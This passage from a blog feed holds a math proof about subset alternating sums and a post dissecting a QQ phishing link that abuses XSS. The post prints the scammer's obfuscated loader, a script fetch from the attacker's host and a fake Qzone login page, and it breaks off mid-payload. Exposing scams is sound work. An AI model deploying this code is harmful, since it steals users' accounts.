    <content type="html"><![CDATA[<p>题: 对于 <span class="math inline">\({1,2,3,...,n}\)</span> 的每一个非空子集，定义一个唯一确定的交替和: 对每个子集按照递减的次序重新排列，然后从最大的数开始交替地减或加后继的数(例如，<span class="math inline">\({1,2,4,6,9}\)</span> 的交替和是 <span class="math inline">\(9-6+4-2+1=6;\)</span> <span class="math inline">\({5}\)</span> 的交替和是 <span class="math inline">\(5\)</span>). 则交替和的总和为<u>______</u>. (用 <span class="math inline">\(n\)</span> 表示)</p><p>初看时，知对任意一个元素，所有包含该元素的集合的个数为 <span class="math inline">\(2^{n-1},\)</span> 而 n 是最大的，始终以「加」的形式在交替和中出现。</p><p>因此，仅仅考虑 <span class="math inline">\(n\)</span> 在交替和的和中的部分，是 <span class="math inline">\(n\times 2^{n-1}\)</span>.</p><p>其余部分呢？有正有负，不好判断。</p><p>手动计算了当 <span class="math inline">\(n=1, n=2, n=3\)</span> 时交替和的和的值，分别为 <span class="math inline">\(1,4,12.\)</span> 然而，它们刚好与 <span class="math inline">\(n\times 2^{n-1}\)</span> 相等。</p><p>便猜想答案是 <span class="math inline">\(n\times 2^{n-1}.\)</span> (「其余部分」精妙地抵消成为 <span class="math inline">\(0\)</span> 了</p><hr /><p>证明:</p><p>令</p><p><span class="math display">\[A_n=\\{ 1,2,3,...,n \\}, B_n=\\{ X\mid X\subset A_n, X\neq \varnothing \\}\]</span></p><p>记交替和的和为 <span class="math inline">\(S_n\)</span></p><p>当 <span class="math inline">\(n=1\)</span> 时，结论显然成立</p><p>假设当 <span class="math inline">\(n=k\)</span> 时，结论成立</p><p>则有</p><p><span class="math display">\[S_k=k\times 2^{k-1}\]</span></p><p>当 <span class="math inline">\(n=k+1\)</span> 时，考虑 <span class="math inline">\(B_{k+1},\)</span> 有以下划分:</p><p><span class="math display">\[\\{ B_k, \\{\\{k+1\\}\\}, \\{X\cup \\{k+1\\} \mid X\in B_k\\} \\}\]</span></p><p><span class="math inline">\(B_k\)</span> 部分的交替和的和即 <span class="math inline">\(S_k=k\times 2^{k-1}\)</span></p><p><span class="math inline">\(\\{\\{k+1\\}\\}\)</span> 部分的交替和的和即 <span class="math inline">\(k+1\)</span></p><p>下面讨论最后一部分的交替和的和</p><p>由于 <span class="math inline">\(k+1\)</span> 是所有这些集合中的最大数，因此在交替和中必为正，加入到 <span class="math inline">\(B_k\)</span> 中的原有集合中后，原有元素在交替和中正负皆改变，故第三部分的交替和的和为</p><p><span class="math display">\[(2^k-1)(k+1)-k\times 2^{k-1}\]</span></p><p>综上，所有交替和的和的和，即 <span class="math inline">\(S_{k+1}=(k+1)\times 2^k\)</span></p><p>即当 <span class="math inline">\(n=k+1\)</span> 时，结论成立，即</p><p><span class="math display">\[\forall n \in N_+, S_n=n \times 2^{n-1} \; \Box\]</span></p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记网友 QQ 被盗群发的套路链接</title>
    <link href="/2018/07/01/%E8%AE%B0%E7%BD%91%E5%8F%8B-QQ-%E8%A2%AB%E7%9B%97%E7%BE%A4%E5%8F%91%E7%9A%84%E5%A5%97%E8%B7%AF%E9%93%BE%E6%8E%A5/"/>
    <url>/2018/07/01/%E8%AE%B0%E7%BD%91%E5%8F%8B-QQ-%E8%A2%AB%E7%9B%97%E7%BE%A4%E5%8F%91%E7%9A%84%E5%A5%97%E8%B7%AF%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<p>又看见一个骗子，趁机水一篇。</p><p>如题，这个套路消息是这样的: 「https://url.cn/5x4a6Hg&amp;tLKvRPKISY 这是你？/微笑」</p><p>用移动设备进入显示是 QQ 空间登录页面，请求输入帐号密码，并盗取 QQ</p><p>这个短网址最先跳转到一个无害的正经网站(fz.fang.com)的搜索请求页，利用 XSS. 而且他用的标签名字就叫 xss. 黑人问号.jpg</p><p>骗子插入了一段 js 代码，src 为 wudi.74sq.cn/404.php (装成 404 页面？</p><p>本来用电脑 curl 之，发现这个 js 是<strong>直接</strong>跳转到腾讯网的(window.location.href = "http://www.qq.com";)</p><p>于是带上手机的 UA 再 curl, 验明:</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">(<span class="hljs-keyword">function</span> <span class="hljs-literal">()</span> &#123;<br>    var new_doc = document.<span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;text/html&quot;</span>, <span class="hljs-string">&quot;replace&quot;</span>);<br>    var html = unescape(<span class="hljs-string">&quot;%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv%3D%22content-type%22%20content%3D%22text/html%3Bcharset%3Dutf-8%22%3E%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3DEdge%22%3E%3Cmeta%20content%3D%22always%22%20name%3D%22referrer%22%3E%0A%3Cscript%20type%3D%22text/javascript%22%3E%0Adocument.write%28decodeURIComponent%28arcfour%28%2236a9dc5d29d54b46793d0c682298dbab%22%2Cbase64_decode%28%22EzORpUle/yXbsLMJsHj2lt+3Y2Rns99J/Lj37LvRiWWB4Sxf075faqUVJ85nCvGPE2VhEVzCxaa3SNtNQVmxTwiW7xoDJXHJC7g4YhkBMxWFvSPf7bmJBojZsq/vyWOPe8uHMpDGYd1XJcqNY1Z4T6CwxCCK+TLfqJkC9d8KTGR+1aZqyLoLttwCLVdzceuZTddKZHuVPUGbh+0WorBVz+JdGk7lmAiZlGMd9kxuDbqvvW6LguR8teQkNAdM+KukG90+pKaGqSVYTBRTUCfJpqS3oA2sVzPHgRDRUA4uelzPC+31esGj6MXfZf7GbC4Z/WzBi6WsTrVAVvzq3oI6RoUEXa7KHj7bWi9b1BhFDxrqihtxwwpYXeWYBmMOrmgyTSiMN7hKxkKp+IGwT6s+KydpW8bT2CshYYffIHO7vu3NpWJQ/p1QLjMl0NlUZntT7TLwUWNdz5Qm95s3zaIJWwjqt+IqwhsSbvqDPwpq8jXtlGpDnNB7u0hPZg%3D%3D%22%29%29%29%29%3B%0A%3C/script%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3C/body%3E%0A%3C/html%3E&quot;</span>);<br>    new_doc.write(html);<br>    new_doc.close<span class="hljs-literal">()</span>;<br>&#125;)<span class="hljs-literal">()</span>;<br>var set = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">iframe</span>&#x27;)</span>;<br>set.src = &#x27;https:<span class="hljs-comment">//www.baidu.com/favicon.ico&#x27;;</span><br>set.style.display = &#x27;none&#x27;;<br>set.onload = <span class="hljs-keyword">function</span> <span class="hljs-literal">()</span> &#123;<br>    set<span class="hljs-constructor">Timeout(<span class="hljs-params">function</span> ()</span> &#123;<br>        set.remove<span class="hljs-literal">()</span>;<br>    &#125;, <span class="hljs-number">9</span>)<br>&#125;<br>document.title = &#x27;&#x27;;<br>document.body.append<span class="hljs-constructor">Child(<span class="hljs-params">set</span>)</span>;<br><span class="hljs-keyword">function</span> base64<span class="hljs-constructor">_encode(<span class="hljs-params">d</span>)</span>&#123;var q=&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;;var z,y,x,w,v,u,t,s,i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>,p=&#x27;&#x27;,r=<span class="hljs-literal">[]</span>;<span class="hljs-keyword">if</span>(!d)&#123;return d&#125;<span class="hljs-keyword">do</span>&#123;z=d.<span class="hljs-built_in">char</span><span class="hljs-constructor">CodeAt(<span class="hljs-params">i</span><span class="hljs-operator">++</span>)</span>;y=d.<span class="hljs-built_in">char</span><span class="hljs-constructor">CodeAt(<span class="hljs-params">i</span><span class="hljs-operator">++</span>)</span>;x=d.<span class="hljs-built_in">char</span><span class="hljs-constructor">CodeAt(<span class="hljs-params">i</span><span class="hljs-operator">++</span>)</span>;s=z&lt;&lt;<span class="hljs-number">16</span><span class="hljs-pattern-match">|y&lt;&lt;8|x;w=s&gt;&gt;18&amp;0x3f;v=s&gt;&gt;12&amp;0x3f;u=s&gt;&gt;6&amp;0x3f;t=s&amp;0x3f;r[j<span class="hljs-operator">++</span>]=q.<span class="hljs-built_in">char</span><span class="hljs-constructor">At(<span class="hljs-params">w</span>)</span>+q.<span class="hljs-built_in">char</span><span class="hljs-constructor">At(<span class="hljs-params">v</span>)</span>+q.<span class="hljs-built_in">char</span><span class="hljs-constructor">At(<span class="hljs-params">u</span>)</span>+q.<span class="hljs-built_in">char</span><span class="hljs-constructor">At(<span class="hljs-params">t</span>)</span>&#125;<span class="hljs-keyword">while</span>(i&lt;d.length);p=r.join(&#x27;&#x27;);var r=d.length%3;return(r?p.slice(0,r-3):p)+&#x27;<span class="hljs-operator">==</span>=&#x27;.slice(r<span class="hljs-operator">||</span>3)&#125;<span class="hljs-keyword">function</span> base64<span class="hljs-constructor">_decode(<span class="hljs-params">d</span>)</span>&#123;var q=&#x27;<span class="hljs-constructor">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</span>+<span class="hljs-operator">/</span>=&#x27;;var z,y,x,w,v,u,t,s,i=0,j=0,r=[];<span class="hljs-keyword">if</span>(!d)&#123;return d&#125;d+=&#x27;&#x27;;<span class="hljs-keyword">do</span>&#123;w=q.index<span class="hljs-constructor">Of(<span class="hljs-params">d</span>.<span class="hljs-params">charAt</span>(<span class="hljs-params">i</span><span class="hljs-operator">++</span>)</span>);v=q.index<span class="hljs-constructor">Of(<span class="hljs-params">d</span>.<span class="hljs-params">charAt</span>(<span class="hljs-params">i</span><span class="hljs-operator">++</span>)</span>);u=q.index<span class="hljs-constructor">Of(<span class="hljs-params">d</span>.<span class="hljs-params">charAt</span>(<span class="hljs-params">i</span><span class="hljs-operator">++</span>)</span>);t=q.index<span class="hljs-constructor">Of(<span class="hljs-params">d</span>.<span class="hljs-params">charAt</span>(<span class="hljs-params">i</span><span class="hljs-operator">++</span>)</span>);s=w&lt;&lt;18|v&lt;&lt;12|u&lt;&lt;6|t;z=s&gt;&gt;16&amp;0xff;y=s&gt;&gt;8&amp;0xff;x=s&amp;0xff;<span class="hljs-keyword">if</span>(u<span class="hljs-operator">==</span>64)&#123;r[j<span class="hljs-operator">++</span>]=<span class="hljs-constructor">String</span>.from<span class="hljs-constructor">CharCode(<span class="hljs-params">z</span>)</span>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(t<span class="hljs-operator">==</span>64)&#123;r[j<span class="hljs-operator">++</span>]=<span class="hljs-constructor">String</span>.from<span class="hljs-constructor">CharCode(<span class="hljs-params">z</span>,<span class="hljs-params">y</span>)</span>&#125;<span class="hljs-keyword">else</span>&#123;r[j<span class="hljs-operator">++</span>]=<span class="hljs-constructor">String</span>.from<span class="hljs-constructor">CharCode(<span class="hljs-params">z</span>,<span class="hljs-params">y</span>,<span class="hljs-params">x</span>)</span>&#125;&#125;<span class="hljs-keyword">while</span>(i&lt;d.length);return r.join(&#x27;&#x27;)&#125;<span class="hljs-keyword">function</span> arcfour(k,d)&#123;var o=&#x27;&#x27;;s=<span class="hljs-keyword">new</span> <span class="hljs-constructor">Array()</span>;var n=256;l=k.length;<span class="hljs-keyword">for</span>(var i=0;i&lt;n;i<span class="hljs-operator">++</span>)&#123;s[i]=i&#125;<span class="hljs-keyword">for</span>(var j=i=0;i&lt;n;i<span class="hljs-operator">++</span>)&#123;j=(j+s[i]+k.<span class="hljs-built_in">char</span><span class="hljs-constructor">CodeAt(<span class="hljs-params">i</span>%<span class="hljs-params">l</span>)</span>)%n;var x=s[i];s[i]=s[j];s[j]=x&#125;<span class="hljs-keyword">for</span>(var i=j=y=0;y&lt;d.length;y<span class="hljs-operator">++</span>)&#123;i=(i+1)%n;j=(j+s[i])%n;x=s[i];s[i]=s[j];s[j]=x;o+=<span class="hljs-constructor">String</span>.from<span class="hljs-constructor">CharCode(<span class="hljs-params">d</span>.<span class="hljs-params">charCodeAt</span>(<span class="hljs-params">y</span>)</span>^s[(s[i]+s[j])%n])&#125;return o&#125;</span><br></code></pre></div></td></tr></table></figure><p>把 unescape 运行一下，得到</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=Edge&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;always&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;referrer&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-title function_">arcfour</span>(<span class="hljs-string">&quot;36a9dc5d29d54b46793d0c682298dbab&quot;</span>,<span class="hljs-title function_">base64_decode</span>(<span class="hljs-string">&quot;EzORpUle/yXbsLMJsHj2lt+3Y2Rns99J/Lj37LvRiWWB4Sxf075faqUVJ85nCvGPE2VhEVzCxaa3SNtNQVmxTwiW7xoDJXHJC7g4YhkBMxWFvSPf7bmJBojZsq/vyWOPe8uHMpDGYd1XJcqNY1Z4T6CwxCCK+TLfqJkC9d8KTGR+1aZqyLoLttwCLVdzceuZTddKZHuVPUGbh+0WorBVz+JdGk7lmAiZlGMd9kxuDbqvvW6LguR8teQkNAdM+KukG90+pKaGqSVYTBRTUCfJpqS3oA2sVzPHgRDRUA4uelzPC+31esGj6MXfZf7GbC4Z/WzBi6WsTrVAVvzq3oI6RoUEXa7KHj7bWi9b1BhFDxrqihtxwwpYXeWYBmMOrmgyTSiMN7hKxkKp+IGwT6s+KydpW8bT2CshYYffIHO7vu3NpWJQ/p1QLjMl0NlUZntT7TLwUWNdz5Qm95s3zaIJWwjqt+IqwhsSbvqDPwpq8jXtlGpDnNB7u0hPZg==&quot;</span>))));</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>还要套，套这么多层</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://libs.baidu.com/jquery/2.0.0/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">$(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">$.<span class="hljs-title function_">getScript</span>(<span class="hljs-string">&#x27;http://wudi.74sq.cn/template/login.js&#x27;</span>); </span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>外面还套个 $() 倒是调用了函数…… http://wudi.74sq.cn/template/login.js, 就是它没错了。</p><p>他又套了一层…… 这个 js 在 document 里 write 了一个包含一段 js 代码的 html, 又套一层。然后终于出现真身:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-cn&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;apple-mobile-web-app-capable&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;yes&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//libs.baidu.com/jquery/2.0.0/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//open.mobile.qq.com/sdk/qqapi.js?_bid=152&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//qzonestyle.gtimg.cn/qzone/phone/style/login.css&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;//wudi.74sq.cn/template/css.css&quot;</span>/&gt;</span><br><span class="hljs-comment">&lt;!--顶部banner--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">setCookie</span>(<span class="hljs-params">name, value</span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> <span class="hljs-title class_">Days</span> = <span class="hljs-number">30</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> exp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();</span><br><span class="language-javascript">exp.<span class="hljs-title function_">setTime</span>(exp.<span class="hljs-title function_">getTime</span>() + <span class="hljs-title class_">Days</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = name + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-built_in">escape</span>(value) + <span class="hljs-string">&quot;;expires=&quot;</span> + exp.<span class="hljs-title function_">toGMTString</span>();</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getCookie</span>(<span class="hljs-params">name</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> arr, reg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&quot;(^| )&quot;</span> + name + <span class="hljs-string">&quot;=([^;]*)(;|$)&quot;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (arr = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">match</span>(reg))</span><br><span class="language-javascript"></span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-built_in">unescape</span>(arr[<span class="hljs-number">2</span>]);</span><br><span class="language-javascript">            <span class="hljs-keyword">else</span></span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">getCookie</span>(<span class="hljs-string">&quot;login&quot;</span>))&#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;https://h5.qzone.qq.com/mqzone/profile?stat=&amp;hostuin=0#0/info/me&#x27;</span>;<span class="hljs-comment">//二次跳转地址</span></span><br><span class="language-javascript">      </span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">  </span><br><span class="language-javascript">$(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"> mqq.<span class="hljs-property">ui</span>.<span class="hljs-title function_">setTitleButtons</span>(&#123;</span><br><span class="language-javascript">   left : &#123;</span><br><span class="language-javascript">       title : <span class="hljs-string">&quot;相册&quot;</span>,</span><br><span class="language-javascript">       callback : <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">       &#125;</span><br><span class="language-javascript">   &#125;,</span><br><span class="language-javascript">   right : &#123;</span><br><span class="language-javascript">       <span class="hljs-attr">hidden</span>: <span class="hljs-literal">true</span></span><br><span class="language-javascript">   &#125;</span><br><span class="language-javascript">&#125;)</span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;zoom: 1;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">p,a,c,k,e,r</span>)&#123;e=<span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<span class="hljs-keyword">return</span>(c&lt;a?<span class="hljs-string">&#x27;&#x27;</span>:<span class="hljs-title function_">e</span>(<span class="hljs-built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="hljs-number">35</span>?<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(c+<span class="hljs-number">29</span>):c.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>))&#125;;<span class="hljs-keyword">if</span>(!<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^/</span>,<span class="hljs-title class_">String</span>))&#123;<span class="hljs-keyword">while</span>(c--)r[<span class="hljs-title function_">e</span>(c)]=k[c]||<span class="hljs-title function_">e</span>(c);k=[<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;<span class="hljs-keyword">return</span> r[e]&#125;];e=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">return</span><span class="hljs-string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="hljs-number">1</span>&#125;;<span class="hljs-keyword">while</span>(c--)<span class="hljs-keyword">if</span>(k[c])p=p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span>+<span class="hljs-title function_">e</span>(c)+<span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>),k[c]);<span class="hljs-keyword">return</span> p&#125;(<span class="hljs-string">&#x27;1 k=$(r);1 5=0;1 